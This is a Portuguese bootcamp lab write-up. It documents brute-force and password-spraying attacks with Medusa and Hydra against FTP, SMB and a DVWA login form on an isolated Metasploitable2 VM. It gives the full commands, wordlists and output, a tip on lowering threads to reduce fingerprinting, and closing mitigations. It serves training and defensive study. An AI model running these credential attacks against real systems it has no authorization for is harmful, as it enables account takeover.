# Desafio — Ataque de Brute Force (Medusa + Kali Linux)
Projeto do Bootcamp Santander — Cibersegurança 2025 (DIO)

## Visão Geral
Este projeto documenta a montagem de um ambiente controlado (Kali Linux + Metasploitable2 + DVWA) e a execução de testes de força bruta utilizando as ferramentas **Medusa** e **Hydra** para fins educacionais.

> ⚠️ **Atenção:** todos os testes foram realizados em VMs locais e isoladas. Não execute estes testes em sistemas sem autorização explícita.

---

## Ambiente
- **Host:** VirtualBox  
- **VMs:**
  - **Kali Linux** (atacante)
  - **Metasploitable 2** (alvo) — IP: `192.168.56.101` (serviços: FTP, SMB, DVWA)
- **Rede:** Host-only / Internal Network (ambas as VMs na mesma rede privada)

---

## Ferramentas utilizadas
- Kali Linux (medusa, hydra, nmap, ftp, smbclient, enum4linux)  
- Medusa  
- Hydra  
- Metasploitable 2 (target)  
- DVWA (web app vulnerável)  
- Wordlists próprias (ex.: `users.txt`, `pass.txt`)  

---

# 1 — Configuração das VMs (resumo)

1. Baixe as ISOs/imagens:
- Kali Linux: https://www.kali.org/get-kali/
- Metasploitable 2: https://sourceforge.net/projects/metasploitable/
- Crie VMs no VirtualBox e monte as imagens.
- Configure a Rede → Host-only para ambas as VMs.

Inicie as VMs e confirme IPs (ip a).

Crie snapshots antes dos testes para fácil restauração.

# 2 — Auditoria / Enumeração
## 2.1 Enumeração inicial (nmap)

Comando:
```
nmap -sV -p 21,22,80,445,139 192.168.56.101
```
Saída de comando:
```
┌──(kali㉿kali)-[~]
└─$ nmap -sV -p 21,22,80,445,139 192.168.56.101 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-15 21:51 EDT
Nmap scan report for 192.168.56.101
Host is up (0.0013s latency).

PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.3.4
22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
80/tcp  open  http        Apache httpd 2.2.8 ((Ubuntu) DAV/2)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
MAC Address: 08:00:27:34:A3:05 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 24.69 seconds
```
# 3 — Força Bruta em FTP (Medusa)
3.1 Preparar wordlists
```
echo -e "user\nmsfadmin\nadmin\nroot" > users.txt
echo -e "123456\npassword\nqwerty\nmsfadmin" > pass.txt
```

3.2 Executar Medusa (FTP)

Comando:
```
medusa -h 192.168.56.101 -U users.txt -P pass.txt -M ftp -t 6
```

Saída
```
┌──(kali㉿kali)-[~]
└─$ medusa -h 192.168.56.101 -U users.txt -P pass.txt -M ftp -t 6
Medusa v2.3 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>

2025-10-15 22:41:12 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: msfadmin (2 of 4, 1 complete) Password: password (1 of 4 complete)
2025-10-15 22:41:12 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: user (1 of 4, 1 complete) Password: msfadmin (1 of 4 complete)
2025-10-15 22:41:12 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: msfadmin (2 of 4, 1 complete) Password: 123456 (2 of 4 complete)
2025-10-15 22:41:12 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: msfadmin (2 of 4, 2 complete) Password: msfadmin (3 of 4 complete)
2025-10-15 22:41:12 ACCOUNT FOUND: [ftp] Host: 192.168.56.101 User: msfadmin Password: msfadmin [SUCCESS]
2025-10-15 22:41:13 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: user (1 of 4, 3 complete) Password: 123456 (2 of 4 complete)
2025-10-15 22:41:13 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: user (1 of 4, 3 complete) Password: password (3 of 4 complete)
2025-10-15 22:41:13 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: user (1 of 4, 3 complete) Password: qwerty (4 of 4 complete)
2025-10-15 22:41:15 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: msfadmin (2 of 4, 4 complete) Password: qwerty (4 of 4 complete)
2025-10-15 22:41:15 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: admin (3 of 4, 4 complete) Password: 123456 (1 of 4 complete)
2025-10-15 22:41:15 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: admin (3 of 4, 4 complete) Password: password (2 of 4 complete)
2025-10-15 22:41:16 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: root (4 of 4, 4 complete) Password: 123456 (1 of 4 complete)
2025-10-15 22:41:16 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: admin (3 of 4, 5 complete) Password: qwerty (3 of 4 complete)
2025-10-15 22:41:16 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: admin (3 of 4, 5 complete) Password: msfadmin (4 of 4 complete)
2025-10-15 22:41:18 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: root (4 of 4, 5 complete) Password: password (2 of 4 complete)
2025-10-15 22:41:18 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: root (4 of 4, 5 complete) Password: qwerty (3 of 4 complete)
2025-10-15 22:41:18 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: root (4 of 4, 5 complete) Password: msfadmin (4 of 4 complete)
```

Percebe-se que na linha 5 da saída do código obtivemos um sucesso, onde ele nos retorna com o usuário: msfadmin e senha: msfadmin.

Validação manual:
```
┌──(kali㉿kali)-[~]
└─$ ftp 192.168.56.101
Connected to 192.168.56.101.
220 (vsFTPd 2.3.4)
Name (192.168.56.101:kali): msfadmin
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> 

```
---
# 4 — Ataque a formulário web (DVWA) — Hydra
4.1 Por que usar o Hydra?

O Hydra é mais direto e compatível com formulários HTTP/POST (http-post-form) e por oferecer sintaxe simples para definir o payload e a fail string, evitando problemas de sintaxe do Medusa em alguns cenários.

4.2 Preparar wordlists

(Pode reaproveitar as wordlists já criadas)

4.3 Capturar requisição (recomendado)

 - Abra DevTools (Network) ou Burp, faça um login falho e copie:

 - URL do action (ex.: /dvwa/login.php)

 - Nomes dos campos (username, password, etc.)

 - Texto exibido em caso de falha (ex.: Login failed) — essa é a fail string.

4.4 Comando Hydra
```
hydra -L users.txt -P pass.txt 192.168.56.101 http-post-form "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed"
```
- `-L users.txt` = Indica o arquivo de lista de usuários
- `-P pass.txt` = Indica o arquivo de lista de senhas
- `192.168.56.101` = Host alvo
- `http-post-form` = O módulo do Hydra que faz ataques contra formulários HTTP que usam o método POST.
- `"/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed"` = É a especificação do formulário, onde:
  - `/dvwa/login.php` = Caminho do formulário no host.
  - `username=^USER^&password=^PASS^&Login=Login` = Dados enviados no POST.
    - `username` e `password` são os nomes dos campos do formulário.
    - `^USER^` e `^PASS^` são placeholders especiais do Hydra que serão substituídos por cada usuário/senha das listas.
    - `&Login=Login` representa campos extras fixos que o form envia (é imporante copiar exatamente o que aparece no DevTools se existir).
    - `Login failed` = Fail string: texto que aparece na resposta quando o login falha. O Hydra usa isso para decidir se a tentativa foi malsucedida; se a resposta não tiver esse text o Hydra considera a tentativa bem-sucedida.
OBS:  Separe cada parâmetro do módulo `http-post-form` com ":".

Saída:
```
┌──(kali㉿kali)-[~]
└─$ hydra -L users.txt -P pass.txt 192.168.56.101 http-post-form "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed"
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-10-16 20:08:37
[DATA] max 16 tasks per 1 server, overall 16 tasks, 16 login tries (l:4/p:4), ~1 try per task
[DATA] attacking http-post-form://192.168.56.101:80/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed
[80][http-post-form] host: 192.168.56.101   login: admin   password: password
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-10-16 20:08:39
```
---
# 5 — Password spraying / SMB (enumeração + Medusa)
5.1 Enumeração SMB (enum4linux)

Comando:
```
enum4linux -a 192.168.56.101 | tee enum4_output.txt
```

Saída (trecho):
```
user:[games] rid:[0x3f2]
user:[nobody] rid:[0x1f5]
user:[bind] rid:[0x4ba]
user:[proxy] rid:[0x402]
user:[syslog] rid:[0x4b4]
user:[user] rid:[0xbba]
user:[www-data] rid:[0x42a]
user:[root] rid:[0x3e8]
user:[news] rid:[0x3fa]
user:[postgres] rid:[0x4c0]
user:[bin] rid:[0x3ec]
user:[mail] rid:[0x3f8]
user:[distccd] rid:[0x4c6]
user:[proftpd] rid:[0x4ca]
user:[dhcp] rid:[0x4b2]
user:[daemon] rid:[0x3ea]
user:[sshd] rid:[0x4b8]
user:[man] rid:[0x3f4]
user:[lp] rid:[0x3f6]
user:[mysql] rid:[0x4c2]
user:[gnats] rid:[0x43a]
user:[libuuid] rid:[0x4b0]
user:[backup] rid:[0x42c]
user:[msfadmin] rid:[0xbb8]
user:[telnetd] rid:[0x4c8]
user:[sys] rid:[0x3ee]
user:[klog] rid:[0x4b6]
user:[postfix] rid:[0x4bc]
user:[service] rid:[0xbbc]
user:[list] rid:[0x434]
user:[irc] rid:[0x436]
user:[ftp] rid:[0x4be]
user:[tomcat55] rid:[0x4c4]
user:[sync] rid:[0x3f0]
user:[uucp] rid:[0x3fc]
```

5.2 Preparar wordlists para spray

```
echo -e 'user\nmsfadmin\nadmin\nservice' > smb_users.txt
echo -e 'password\n123456\nWelcome123\nmsfadmin' > senhas_spray.txt
```
5.3 Executar Medusa (SMB NT)

Comando
```
medusa -h 192.168.56.101 -U smb_users.txt -P senhas_spray.txt -M smbnt -t 2
```
 - `-t 2` → threads menores para reduzir fingerprinting/ carga

Saída:
```
┌──(kali㉿kali)-[~]
└─$ medusa -h 192.168.56.101 -U smb_users.txt -P senhas_spray.txt -M smbnt -t 2      
Medusa v2.3 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>

2025-10-16 21:52:43 ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: user (1 of 4, 0 complete) Password: 123456 (1 of 4 complete)
2025-10-16 21:52:43 ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: user (1 of 4, 0 complete) Password: password (2 of 4 complete)
2025-10-16 21:52:43 ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: user (1 of 4, 0 complete) Password: Welcome123 (3 of 4 complete)
2025-10-16 21:52:43 ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: user (1 of 4, 1 complete) Password: msfadmin (4 of 4 complete)
2025-10-16 21:52:43 ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: msfadmin (2 of 4, 1 complete) Password: password (1 of 4 complete)
2025-10-16 21:52:43 ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: msfadmin (2 of 4, 1 complete) Password: 123456 (2 of 4 complete)
2025-10-16 21:52:43 ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: msfadmin (2 of 4, 1 complete) Password: Welcome123 (3 of 4 complete)
2025-10-16 21:52:43 ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: msfadmin (2 of 4, 2 complete) Password: msfadmin (4 of 4 complete)
2025-10-16 21:52:43 ACCOUNT FOUND: [smbnt] Host: 192.168.56.101 User: msfadmin Password: msfadmin [SUCCESS (ADMIN$ - Access Allowed)]
2025-10-16 21:52:43 ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: admin (3 of 4, 3 complete) Password: password (1 of 4 complete)
2025-10-16 21:52:43 ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: admin (3 of 4, 3 complete) Password: 123456 (2 of 4 complete)
2025-10-16 21:52:43 ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: admin (3 of 4, 3 complete) Password: Welcome123 (3 of 4 complete)
2025-10-16 21:52:43 ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: admin (3 of 4, 4 complete) Password: msfadmin (4 of 4 complete)
2025-10-16 21:52:43 ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: service (4 of 4, 4 complete) Password: password (1 of 4 complete)
2025-10-16 21:52:43 ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: service (4 of 4, 4 complete) Password: 123456 (2 of 4 complete)
2025-10-16 21:52:43 ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: service (4 of 4, 4 complete) Password: Welcome123 (3 of 4 complete)
2025-10-16 21:52:43 ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: service (4 of 4, 5 complete) Password: msfadmin (4 of 4 complete)
```
Observe que obtivemos um "ACCOUNT FOUND", o que significa que uma das tentativas houve um sucesso, nos retornando `User: msfadmin Password: msfadmin [SUCCESS (ADMIN$ - Access Allowed)]`.

Validação com smbclient:

```
smbclient -L //192.168.56.101 -U msfadmin
```
Saída (início):
```
┌──(kali㉿kali)-[~]
└─$ smbclient -L //192.168.56.101 -U msfadmin
Password for [WORKGROUP\msfadmin]:
```
- Informe a senha `msfadmin`

Saída(final):
```
Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        tmp             Disk      oh noes!
        opt             Disk      
        IPC$            IPC       IPC Service (metasploitable server (Samba 3.0.20-Debian))
        ADMIN$          IPC       IPC Service (metasploitable server (Samba 3.0.20-Debian))
        msfadmin        Disk      Home Directories
Reconnecting with SMB1 for workgroup listing.

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        WORKGROUP            METASPLOITABLE
```
---
# 7 — Mitigações recomendadas
- Política de senhas fortes e expiração.
- Limite de tentativas de login e bloqueio.
- MFA para serviços críticos.
- Desativar serviços desnecessários.
- Alertas para múltiplas falhas de autenticação.
- Proteções em formulários web: CSRF tokens, CAPTCHA, rate limiting, HTTPS.

